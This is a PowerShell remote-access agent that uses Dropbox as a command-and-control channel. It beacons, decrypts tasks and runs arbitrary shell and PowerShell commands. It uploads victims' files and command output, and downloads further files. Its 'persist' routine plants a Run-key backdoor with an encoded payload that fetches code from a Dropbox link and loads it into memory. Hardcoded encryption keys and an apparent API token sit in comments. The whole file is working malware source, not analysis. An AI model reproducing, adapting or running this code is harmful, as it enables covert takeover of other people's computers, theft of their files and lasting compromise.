Function Invoke-DBC2{

    Function Invoke-Bot{

            $Global:secretIV = "Key@123Key@123fd"
            $Global:SecretKey = "secret#456!23key"

            Function Aes-Decrypt($DecryptData){    

                #Use the AES cipher and represent it as an object.
                $AES = New-Object "System.Security.Cryptography.AesManaged"
                $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
                $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                $AES.BlockSize = 128
                $AES.KeySize = 128
                $enc = [system.Text.Encoding]::UTF8
                $AES.IV = $enc.GetBytes($Global:secretIV)
    
                # $AES.Key = [byte[]] @( 1..32 )
   
                $enc = [system.Text.Encoding]::UTF8
                $key = $enc.GetBytes($Global:SecretKey) 
                $AES.Key = $key
                $Decryptor = $AES.CreateDecryptor()

                $EncryptedBytes = [Convert]::FromBase64String($DecryptData)

                # Creates a MemoryStream to do the encryption in 
                $MemoryStream = New-Object -TypeName System.IO.MemoryStream

                # Creates the new Cryptology Stream --> Outputs to $MS or Memory Stream 
                $StreamMode = [System.Security.Cryptography.CryptoStreamMode]::Write
                $cs = New-Object -TypeName System.Security.Cryptography.CryptoStream -ArgumentList $MemoryStream,$Decryptor,$StreamMode
                $cs.Write($EncryptedBytes, 0, $EncryptedBytes.Length)
                $cs.FlushFinalBlock()
                # Stops the crypology stream
                $cs.Dispose()

	            # Stops writing to Memory
	            $MemoryStream.Close()
	
	            $cs.Clear()

                # Takes the MemoryStream and puts it to an array
	            [byte[]] $PlainBytes = $MemoryStream.ToArray()

                return [Text.Encoding]::UTF8.GetString($PlainBytes)

            }

            Function Aes-Encrypt($data){    

                #Use the AES cipher and represent it as an object.
                $AES = New-Object "System.Security.Cryptography.AesManaged"
                $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
                $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                $AES.BlockSize = 128
                $AES.KeySize = 128
                $enc = [system.Text.Encoding]::UTF8
                $AES.IV = $enc.GetBytes('Key@123Key@123fd')
    
                # $AES.Key = [byte[]] @( 1..32 )
   
                $enc = [system.Text.Encoding]::UTF8
                $key = $enc.GetBytes('secret#456!23key') 
                $AES.Key = $key
                $Decryptor = $AES.CreateEncryptor()

                $InputBytes = [System.Text.Encoding]::UTF8.GetBytes($data)

                # Creates a MemoryStream to do the encryption in 
                $MemoryStream = New-Object -TypeName System.IO.MemoryStream

                # Creates the new Cryptology Stream --> Outputs to $MS or Memory Stream 
                $StreamMode = [System.Security.Cryptography.CryptoStreamMode]::Write
                $cs = New-Object -TypeName System.Security.Cryptography.CryptoStream -ArgumentList $MemoryStream,$Decryptor,$StreamMode
    
                $cs.Write($InputBytes, 0, $InputBytes.Length);
                $cs.FlushFinalBlock();
    
                # Stops the crypology stream
                $cs.Dispose()

	            # Stops writing to Memory
	            $MemoryStream.Close()
	
	            # Clears the IV and HASH from memory to prevent memory read attacks
	            $cs.Clear()

                # Takes the MemoryStream and puts it to an array
	            [byte[]]$rmesult = $MemoryStream.ToArray()
                $MemoryStream.Dispose()
    
	            # return $ms.ToArray()
	            # Converts the array from Base 64 to a string and returns
	            return [Convert]::ToBase64String($rmesult)

            }

            class dropbox{   
                    # Static Properties
                    static [String] $ApiKey = " " #Insert DropBox AccessToken Here
                    static [String] $TargetfilePath
                    static [String] $root = "dropbox"

                    # [dropbox]::dropboxPutfile("/ExfilStuff/Harold-Reloaded.ps1"".\Untitled1.ps1")
                    static [string]dropboxPutfile($TargetfilePath,$data){

                        $ApiK = [dropbox]::Apikey
                        $arguments = '{ "path": "' + $TargetfilePath + '", "mode": "add", "autorename": true, "mute": false }'

                        #Give it our Api-Key to interact with the Dropbox Api qkwLVnGMbKAAAAAAAAAADatC6sz__QhZG0aEWZhx0TlWIOIVGXpUP7084vCnnnD2
                        $authorization = "Bearer $ApiK" 
                        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
                        $headers.Add("Authorization", $authorization)
                        $headers.Add("Dropbox-API-Arg", $arguments)
                        $headers.Add("Content-Type", 'application/octet-stream')
                        $Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");
      
                        #DROPBOX HASHTABLE
                        $dropboxAPI = @{

                             "listFolder"="https://api.dropboxapi.com/2/files/list_folder" 
                             "move"="https://api.dropboxapi.com/2/files/move" 
                             "uploadFile"="https://content.dropboxapi.com/2/files/upload" 
                             "downloadFile"="https://content.dropboxapi.com/2/files/download" 
                             "deleteFile"="https://api.dropboxapi.com/2/files/delete"
                             "getMetaData"="https://api.dropboxapi.com/2/files/get_metadata" 
                        }

                        $res = Invoke-RestMethod -Uri $dropboxAPI.uploadFile -Method Post -InFile $data -Headers $headers
        
                        if($res.Content){
                            return ConvertFrom-SecureString $res.Content
                        }

                        return $res.rev         
                    }

                    # [dropbox]::getRevNumber("/ExfilStuff/Harold-Reloaded2.ps1","") 
                    static [string]getRevNumber($TargetfilePath,$body){    
                        
                        $ApiK = [dropbox]::Apikey
                        $arguments = '{ "path:"' + $TargetfilePath + '","include_media_info": false, "include_deleted": false,"include_has_explicit_shared_members": false }'

                        #Give it our Api-Key to interact with the Dropbox Api qkwLVnGMbKAAAAAAAAAADatC6sz__QhZG0aEWZhx0TlWIOIVGXpUP7084vCnnnD2
                        $authorization = "Bearer $ApiK" 
                        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
                        $headers.Add("Authorization", $authorization)
                        $headers.Add("Dropbox-API-Arg", $arguments)
                        $headers.Add("Content-type","application/json")
                        $Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");
        
                        $res = Invoke-RestMethod -Uri https://api.dropboxapi.com/1/metadata?root=dropbox`&`path=$TargetfilePath -Method Post -Headers $headers -Body (ConvertTo-Json $Body)

                        $res.rev

                        return $res.rev
                    }

                    # [dropbox]::deleteFile("/ExfilStuff/Harold-Reloaded2.ps1","")
                    static [string]deleteFile($TargetfilePath,$body){    
                        $ApiK = [dropbox]::Apikey
                        $arguments = '{ "path:"' + $TargetfilePath + '" }'

                        #Give it our Api-Key to interact with the Dropbox Api qkwLVnGMbKAAAAAAAAAADatC6sz__QhZG0aEWZhx0TlWIOIVGXpUP7084vCnnnD2
                        $authorization = "Bearer $ApiK" 
                        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
                        $headers.Add("Authorization", $authorization)
                        $headers.Add("Dropbox-API-Arg", $arguments)
                        $headers.Add("Content-type","application/json")
                        $Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");
        
                        $res = Invoke-RestMethod -Uri https://api.dropboxapi.com/1/fileops/delete?root=dropbox`&`path=$TargetfilePath -Method Post -Headers $headers -Body (ConvertTo-Json $Body)

                        if($res.Content){
                            return ConvertFrom-SecureString $res.Content
                        }

                        return $res.rev
                    }

                    # [dropbox]::downloadFile("/ExfilStuff/Harold-Reloaded.ps1","Harold-Reloaded.ps1")
                    static [string]downloadFile($TargetFilePath,$localfile){

                        $ApiK = [dropbox]::Apikey
                        $arguments  = '{ "path":"' + $TargetFilePath + '"}'
                        $authorization = "Bearer $ApiK"
                        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
                        $headers.Add("Authorization", $authorization)
                        $headers.Add("Dropbox-API-Arg", $arguments)
 
                         try{
                            Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/download -Method Post -ContentType '' -OutFile $localfile -Headers $headers -ErrorAction:Stop
                            return $true 
                        }catch{ 
                            return $false 
                        }      
                    }

                    # [dropbox]::readFile("/ExfilStuff/Harold-Reloaded.ps1")
                    static [string]readFile($TargetFilePath){
                        
                        $ApiK = [dropbox]::Apikey
                        $wc = New-Object System.Net.WebClient
                        $arguments  = '{ "path":"' + $TargetFilePath + '"}'
                        $authorization = "Bearer $ApiK"
                        $wc.Headers.Add("Authorization", $authorization)
                        $wc.Headers.Add("Dropbox-API-Arg", $arguments)
 
                        try{
                            $response = $wc.DownloadString("https://content.dropboxapi.com/2/files/download")
                            return $response 
                        }catch{ 
                            return $false 
                        }      
                    }
            }

            class C2_Agent{
        
                    static [bool]$shellMode = $false

                    #Implements the !run command which executes arbitrary commands
                    static [array]RunCommand($command)
                    {
                        [string] $CmdPath = "$env:windir\System32\cmd.exe"
                        [string] $CmdString = "$CmdPath" + " /C " + "$Command"
                        #Chose IEX cause it handles arguments as a string but will wait until cmd completes
                        Write-Verbose "I am running: $CmdString" 
                        return Invoke-Expression $CmdString
                    }

                    static [bool]launchProcess($exeName)
                    {
            
                        #Chose IEX cause it handles arguments as a string but will wait until cmd completes
                        Write-Verbose "I am running: $exeName"
                        Start-Process $exeName 
                        return $true 
                    }

                    static [string]createAgentID()
                    {
            
                        $str2 = ""
                        $str3 = [System.String]::Empty
                        $colitmes = [System.String]::Empty

                        $str2 = (Get-WmiObject -class "Win32_Processor" -namespace "root/CIMV2" -computername $env:COMPUTERNAME).DeviceID
                     
                        #Get the MAC address from the first NIC interface found
                        $str3 = (gwmi -Class Win32_NetworkAdapterConfiguration).MACAddress
            
                        # Eventually, compute a MD5 hash of both cpuID and sMacAddress
           
                        $enc = [system.Text.Encoding]::UTF8
                        $tmpSource = $enc.GetBytes($str3 + $str2)
                        $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
                        $utf8 = new-object -TypeName System.Text.UTF8Encoding
                        $tmpski = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($tmpSource)))
                        $uniqueID = $tmpski.Replace("-","").ToLower()
                        return $uniqueID
                    } 

                    static [string]getRandomPeriod()
                    {

                            [string]$random = (Get-Random -InputObject 5, 8, 10)
                            return $random
                                  
                    }

                    static [string]runShell($command){

                                #Check if we already have a shell child process running
                                #If not, start it and create the output and error data received callback
              
                                $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
                                $ProcessStartInfo.CreateNoWindow = $true
                                $ProcessStartInfo.UseShellExecute = $false
                                $ProcessStartInfo.RedirectStandardInput = $true
                                $ProcessStartInfo.RedirectStandardOutput = $true
                                $ProcessStartInfo.RedirectStandardError = $true
                                $ProcessStartInfo.FileName = "powershell.exe"
                                $ProcessStartInfo.Arguments = "-NoLogo -NonInteractive -ExecutionPolicy Bypass","$command"


                                # Creating process object.
                                $oProcess = New-Object -TypeName System.Diagnostics.Process
                                $oProcess.StartInfo = $ProcessStartInfo
                                $oProcess.EnableRaisingEvents = $True

                                $Process = [System.Diagnostics.Process]::Start($ProcessStartInfo)
    
                                # Creating string builders to store stdout and stderr.
                                $oStdOutBuilder = New-Object -TypeName System.Text.StringBuilder
                                $oStdErrBuilder = New-Object -TypeName System.Text.StringBuilder

                                # Adding event handers for stdout and stderr.
                                $sScripBlock = {
                                    if (! [String]::IsNullOrEmpty($EventArgs.Data)) {
                                        $Event.MessageData.AppendLine($EventArgs.Data)
                                    }
                                }

                                $oStdOutEvent = Register-ObjectEvent -InputObject $oProcess -Action $sScripBlock -EventName 'OutputDataReceived' -MessageData $oStdOutBuilder
                                $oStdErrEvent = Register-ObjectEvent -InputObject $oProcess -Action $sScripBlock -EventName 'ErrorDataReceived' -MessageData $oStdErrBuilder

                                 # Starting process.
                                 [Void]$oProcess.Start()
                                $oProcess.BeginOutputReadLine()
                                $oProcess.BeginErrorReadLine()
                                [Void]$oProcess.WaitForExit()

                                 # Unregistering events to retrieve process output.
                                Unregister-Event -SourceIdentifier $oStdOutEvent.Name
                                Unregister-Event -SourceIdentifier $oStdErrEvent.Name

                                $shellOutput = New-Object -TypeName PSObject -Property ([Ordered]@{
             
                                    "ExitCode" = $Process.ExitCode;
                                    "StdOut"   = $oStdOutBuilder.ToString().Trim();
                                    "StdErr"   = $oStdErrBuilder.ToString().Trim()

                                 })
                                 [c2_agent]::shellMode = $false
                                 $oProcess.StandardInput.WriteLine($command)
                     
                                 return $shellOutput.StdOut
                                 #return $shellOutput.ExitCode     
                            }                                                               
            }

            #############################CONFIG DATA################################## 
            $Tab = [char]9

            # Get a unique ID for the machine this agent is running on
            $c2_agentID = [C2_agent]::createAgentID()

            $result = $null
            # Break flag used to exit the agent
            $breakFlag = $false


            # Creating files used for C2
            $C2StatusFile = "/" + $c2_agentID + ".status"
            $C2CmdFile = "/" + $c2_agentID + ".cmd"

            New-Item ".\Untitled.ps1"
            $C2CmdFileLastRevNumber = [dropbox]::dropboxPutfile($C2CmdFile,".\Untitled.ps1")
            $C2StatusFileLastRevNumber = [dropbox]::dropboxPutfile($C2StatusFile,".\Untitled.ps1")

            
            ## reading the cmd file
            $enc = [system.Text.Encoding]::UTF8
            $Global:oldCommand = [dropbox]::readFile($C2CmdFile) 


            Write-Output "Checking Created C2 files"
            if ($c2StatusFileLastRevNumber -eq [String]::Empty -And $c2CmdFileLastRevNumber -eq [String]::Empty)
            {
                   ##Another Agent is running Break
                   Write-Host "[Main][ERROR] Cannot create files on the C2 server"
                   $breakFlag = $true
            }
            else
            {
                   Write-Host "[Main] C2 Files created - Agent ready"
            }

            try{

                #Set initial sleep time to the nominal polling period with a deviation
                $C2_AgentSleeptime = [C2_agent]::getRandomPeriod()
                Write-Output "Setting The random Period: $C2_AgentSleeptime"

                $nano = [dropbox]::readFile($C2CmdFile)
                $nano
                # Wait for the polling period to time out
                Write-Output "Waiting for Polling out Period!!"
                Start-Sleep $C2_AgentSleeptime
            
                Write-Host "[Main loop] Waking up"
                # Calculate next sleep time

                $C2_AgentSleeptime = [C2_agent]::getRandomPeriod()
                Write-Output "Calculating Next Sleep time: $C2_AgentSleeptime"

                # At each cycle, 'touch' the status file to show the agent is alive = beaconing
                $C2StatusFileLastRevNumber = [dropbox]::deleteFile($C2StatusFile,"")
                Start-Sleep 3
                $C2StatusFileLastRevNumber = [dropbox]::dropboxPutfile($C2StatusFile,".\Untitled.ps1")
                Start-Sleep 12

                ## read the cmd file
                $enc = [system.Text.Encoding]::UTF8
                $NewCommand = [dropbox]::readFile($C2CmdFile)
                $NewCommand
    
                if ( $NewCommand -eq $oldCommand ){

                    Write-Host "There Are No New instructions Found :)"
                    Start-Sleep 3
                    [dropbox]::deleteFile($C2cmdFile,"")                       
                    Invoke-DropBox
                                       
                }
                else {
                    Write-Host "There Are New instructions Found :)" 
            
                    # Read the content of the C2 file      
                    $content = Aes-Decrypt([dropbox]::readFile("$C2CmdFile"))

                    $strReader = New-Object System.IO.StringReader($content)
                    [string]$command = $strReader.ReadLine()
                    $command

                    Write-Host "[Main loop] Command to execute: $command"
 
                    switch($command){

                         "launchProcess"{
                   
                             [string]$taskID = $strReader.ReadLine()
                             $taskID
                             [string]$result = $strReader.ReadLine()
                             $result
                             [string]$taskResultFile = "/" + $c2_agentID + "." + $taskID
                             $taskResultFile
                       
                             Write-Host "$Tab [launchProcess] Executing: $result" # + arguments + "

                             #Execute the command
                             if ([c2_agent]::launchProcess($result))
                             {
                                Write-Host "$Tab $Tab OK - PROCESS STARTED: $result"
                                $launchResult = Aes-Encrypt("OK - PROCESS STARTED: $result")     
                             }
                             else
                             {
                                Write-Host "$Tab $Tab ERROR - COULD NOT EXECUTE: $exeName"                                             
                                $launchResult = Aes-Encrypt("[launchProcess][ERROR] External command did not executed properly")                  
                             }
                             $launchResult >  "C:\ps\launcher.txt"
                             $launcherFile = "C:\ps\launcher.txt"
                             # Push the command result to the C2 server                   
                             [dropbox]::dropboxPutfile($taskResultFile,$launcherFile)
                             rm "C:\ps\launcher.txt"

                        } 

                         "runCLI"{
                    
                             [string]$taskID = $strReader.ReadLine()
                             $taskID
                             [string]$result = $strReader.ReadLine()
                             $result
                             [string]$taskResultFile = "/" + $c2_agentID + "." + $taskID
                             $taskResultFile

                             Write-Host "$Tab [runCLI] Executing: + $result"
                             #Execute the command
                             $results = [c2_agent]::RunCommand($result) | Out-String
                             $result1 = Aes-Encrypt($results)
                             $result1 > "C:\ps\test.txt"
                             if ($result -eq $null){
                                Write-Host "$Tab [runCLI][ERROR] External command did not executed properly"
                             }
                             $data4 = "C:\ps\test.txt"
                             # Push the command result to the C2 server
                    
                             [dropbox]::dropboxPutfile($taskResultFile,$data4)
                             rm "C:\ps\test.txt"

                         }

                         "shell"{
                     
                             [string]$taskID = $strReader.ReadLine()
                             $taskID
                             [string]$result = $strReader.ReadLine()
                             $result
                             [string]$taskResultFile = "/" + $c2_agentID + "." + $taskID
                             $taskResultFile
   
                             #Check if we're in shellMode
                             Write-Output "$Tab Checking ShellMode" 
                             Write-Host "$Tab $Tab [shell] Executing: + $result"
                             # Send the command to the child process
                             $shellOp = [c2_agent]::runShell($result)
                             $shellOutput =  Aes-Encrypt($shellOp)
                                        
                             Write-Output "$Tab $Tab Writing Shell Output" + $shellOutput 

                             Write-Output "$Tab $Tab Creating C2 dd files"
                             $C2ddFile = "/" + $c2_agentID + ".dd"
                             $shellOutput >> "C:\ps\$C2ddFile"
                             $ddfile = "C:\ps\$C2ddFile"

                             Write-Output "$Tab $Tab Writing output File to the C2 DeadDrop"
                             [dropbox]::dropboxPutfile($C2ddFile,"C:\ps\$C2ddFile")

                             Write-Output "$Tab $Tab Deleting Old DD File"
                             rm "C:\ps\$C2ddFile"
                
                         } 
                 
                         "downloadFile"{
                  
                            [string]$taskID = $strReader.ReadLine()
                            $taskID
                            $remoteFile = $strReader.ReadLine()
                            $remoteFile
                            $localPath =  $strReader.ReadLine()
                            $localPath
                            $fileName  =  $strReader.ReadLine()
                            $fileName
                            $taskResultFile = $strReader.ReadLine()
                            [string]$taskResultFile = "/" + $c2_agentID + "." + $taskID
                            $taskResultFile   
                 
                            If ( $localPath = "temp" ){
                                $localPath = $env:TEMP
                            }

                            Write-Output "$Tab $Tab [downloadFile] Downloading file from $remoteFile to $localPath $fileName"
                        
                            $restski = "$localPath\$fileName"
                            if ( [dropbox]::downloadFile($remoteFile,$restski) ){
                    
                                 Write-Output "$Tab $Tab [downloadFile] File downloaded"
                                 $fileresult = Aes-Encrypt("OK - FILE DOWNLOADED AT:" + $restski)
                            } 
                            else{
                        
                                 Write-Output "$Tab $Tab [downloadFile][ERROR] Could not download file"
                                 $fileresult = Aes-Encrypt("ERROR - COULD NOT WRITE FILE AT LOCATION: "+$restski)
                            }

                            # Remote file must be deleted
                            [dropbox]::deleteFile($remoteFile,"")
                    
                            $fileresult > "C:\ps\test3.txt"
                            $dataness = "C:\ps\test3.txt"


                            # Push the command result to the C2 server
                            [dropbox]::dropboxPutfile($taskResultFile,$dataness)
                    
                            rm $dataness
                         } 
                 
                         "sendFile"{
                    
                            [string]$taskID = $strReader.ReadLine()
                            $taskID
                            [string]$localFile = $strReader.ReadLine()
                            $localFile
                            $taskResultFile = $strReader.ReadLine()
                            [string]$taskResultFile = "/" + $c2_agentID + "." + $taskID
                            $taskResultFile
                            $remoteFile = $taskResultFile + ".rsc"

                            if (  Test-Path $localFile ){
                            
                                 # First push the wanted local file to the C2 server
                                 [dropbox]::dropboxPutfile($remoteFile,$localFile)
                                 Write-Output "$Tab [sendFile] File uploaded"
                                 $res = $remoteFile
                                 $result =  Aes-Encrypt($res)  
                                 
                                   
                            }else{

                                 $res = "ERROR - FILE NOT FOUND: " + $localFile    
                                 Write-Output "$Tab $Tab [sendFile][ERROR] Command did not executed properly. Localfile not found " + $localFile
                                 $result = Aes-Encrypt($res)    
                    
                            }
                            $result >>  "C:\ps\test4.txt"
                            $dataness = "C:\ps\test4.txt"

                            # Push the command result to the C2 server
                            [dropbox]::dropboxPutfile($taskResultFile,$dataness)

                            rm $dataness
                                   
                         }
            
                         "persist"{

                                [parameter()]$name = "nanobots"
        
                                $url  = "powershell.exe -NoP -sta -NonI -W Hidden -Enc JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAFUAcwBlAHIALQBBAGcAZQBuAHQAIgAsACIATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcAaQBuADYANAA7ACAAeAA2ADQAOwAgAHIAdgA6ADQAOQAuADAAKQAgAEcAZQBjAGsAbwAvADIAMAAxADAAMAAxADAAMQAgAEYAaQByAGUAZgBvAHgALwA0ADkALgAwACIAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAKACQAawA9ACIANQAwAGYAYgA4AGEANgBiADAAZABjADMAZQA5ADkANwA0ADMAOABmADMAYQBlADEAMAA2ADMAMwA5ADkANwAxADEANAAxAGMANgAzADQANgA1ADcANQAyADEAZAA3ADcAMAA5ADMANgA1AGEAMwBjADcAYQBlADIAOAAzAGYAOAAiADsAJABpAD0AMAA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAoAFsAYgB5AHQAZQBbAF0AXQAoACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAiAGgAdAB0AHAAcwA6AC8ALwB3AHcAdwAuAGQAcgBvAHAAYgBvAHgALgBjAG8AbQAvAHMALwAyAHcAYwB2ADYAaQA1AGkAcAB5ADUAMgA2AG4ANwAvAGQAZQBmAGEAdQBsAHQALgBhAGEAPwBkAGwAPQAxACIAKQApACkAfAAlAHsAJABfAC0AYgB4AG8AcgAkAGsAWwAkAGkAKwArACUAJABrAC4AbABlAG4AZwB0AGgAXQB9AAoAWwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoACQAYgApACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKACQAcAA9AEAAKAAiAHEAawB3AEwAVgBuAEcATQBiAEsAQQBBAEEAQQBBAEEAQQBBAEEAQQBEAGEAdABDADYAcwB6AF8AXwBRAGgAWgBHADAAYQBFAFcAWgBoAHgAMABUAGwAVwBJAE8ASQBWAEcAWABwAFUAUAA3ADAAOAA0AHYAQwBuAG4AbgBEADIAIgAsACAAIgBYAGwAbQBsAFIASwBTAGcATABoAFIAcwBJAFYAdABDAG8AeABLAFIAOAB3AD0APQAiACkACgBbAGQAcgBvAHAAYgBvAHgAYwAyAC4AQwAyAF8AQQBnAGUAbgB0AF0AOgA6AE0AYQBpAG4AKAAkAHAAKQA="
                                $RegistryRunKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

                                Write-Output "$Tab Checking For Our Backdoor Runkey"
                                $check = Test-Path "HKLM:\Software\$name"

                                if ($check -eq $False)
                                {
                                     Write-Output "$Tab $Tab Creating our Backdoor RegKey"
                                     New-Item -Path "HKLM:\SOFTWARE" -Name $name -Value $url

                                     #Get the default registry value key
                                     Write-Output "$Tab $Tab Getting our Registry Value Key"
                                     $value = (Get-ItemProperty "HKLM:\Software\$name").'(default)'

                                     #Write output of registry key value to  a ps file
                                     Write-Output "$Tab $Tab Writing Value Keys to Our backdoor Ps File"
                                     Write-Output $value > "C:\Windows\System32\$name.ps1"

                                     #Command to be Executed by Registry Runkey 
                                     Write-Output "$Tab $Tab Setting Command to be Executed by Registry RunKey"
                                     $cmd = "C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -Hidden -NoP -sta -File `"C:\Windows\System32\$name.ps1`""

                                     #Set the autorun regkey where we call our backdoor script
                                     Write-Verbose "$Tab $Tab Setting Autorun Backdoor Regkey"
                                     Set-ItemProperty -Path $RegistryRunKey -Name $name -Value $cmd

                                     Write-Output "$Tab $Tab Success!"
            
                                }else{
                             
		                             Write-Output "$Tab $Tab Failed To Install Backdoor"
                                     Break 
	                            }
                            }

                         "runPS"{
                    
                             [string]$taskID = $strReader.ReadLine()
                             $taskID
                             [string]$result = $strReader.ReadLine()
                             $result
                             [string]$taskResultFile = "/" + $c2_agentID + "." + $taskID
                             $taskResultFile

                             Write-Host "$Tab [runPS] Executing: + $result"
                             #Execute the command
                             $PSres = Invoke-Expression $result
                             $PSresult = Aes-Encrypt($PSres)
                             $PSresult > "C:\ps\test.txt"
                             if ($result -eq $null){
                                Write-Host "$Tab $Tab [runCLI][ERROR] External command did not executed properly"
                             }

                             $PSFile = "C:\ps\test.txt"
                             # Push the command result to the C2 server
                             Write-Host "$Tab $Tab Push The Resulting Command to DropBox"
                             [dropbox]::dropboxPutfile($taskResultFile,$PSFile)
                             rm "C:\ps\test.txt"

                         }             
                    }                        
                }   
            }
            catch
            {         
                Write-Host "$Tab Error has occurred. Restarting"
                Invoke-DropBox     
            }
            finally{
            
                #Make the processed command the "lastcommand" so that it can be compared against in the next loop
                Write-Output "Making the latest command the last command for comparing."
                [string] $Global:oldCommand = $NewCommand
                Start-Sleep 2
                [dropbox]::deleteFile($C2cmdFile,"") 
                      
            }

    }

    #Loop forever until quit
    for (;;) {
        Invoke-Bot 
    }
}